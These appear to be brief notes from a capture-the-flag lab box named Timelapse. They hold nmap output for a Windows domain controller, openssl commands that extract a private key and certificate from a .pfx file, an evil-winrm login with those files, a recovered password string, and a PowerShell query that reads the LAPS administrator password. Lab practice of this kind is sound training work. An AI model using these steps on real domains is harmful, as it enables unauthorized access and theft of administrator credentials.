

```text
PORT      STATE SERVICE        REASON
53/tcp    open  domain         syn-ack ttl 127
88/tcp    open  kerberos-sec   syn-ack ttl 127
135/tcp   open  msrpc          syn-ack ttl 127
139/tcp   open  netbios-ssn    syn-ack ttl 127
389/tcp   open  ldap           syn-ack ttl 127
445/tcp   open  microsoft-ds   syn-ack ttl 127
464/tcp   open  kpasswd5       syn-ack ttl 127
593/tcp   open  http-rpc-epmap syn-ack ttl 127
636/tcp   open  ldapssl        syn-ack ttl 127
5986/tcp  open  wsmans         syn-ack ttl 127
9389/tcp  open  adws           syn-ack ttl 127
49667/tcp open  unknown        syn-ack ttl 127
49673/tcp open  unknown        syn-ack ttl 127
49674/tcp open  unknown        syn-ack ttl 127
49693/tcp open  unknown        syn-ack ttl 127
63059/tcp open  unknown        syn-ack ttl 127

PORT     STATE    SERVICE           REASON          VERSION
53/tcp   open     domain            syn-ack ttl 127 Simple DNS Plus
88/tcp   open     kerberos-sec      syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-10-06 00:18:43Z)
135/tcp  open     msrpc             syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open     netbios-ssn       syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open     ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open     microsoft-ds?     syn-ack ttl 127
593/tcp  open     ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open     ldapssl?          syn-ack ttl 127
3268/tcp open     ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open     globalcatLDAPssl? syn-ack ttl 127
5985/tcp filtered wsman             no-response
9389/tcp open     mc-nmf            syn-ack ttl 127 .NET Message Framing
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

timelapse.htb
dc1.timelapse.htb















openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key-enc
openssl rsa -in legacyy_dev_auth.key-enc -out legacyy_dev_auth.key
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
 
 
 evil-winrm -i $IP -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt




E3R$Q62^12p7PLlC%KWaxuaV

Get-ADComputer DC01 -property 'ms-mcs-admpwd'



https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html
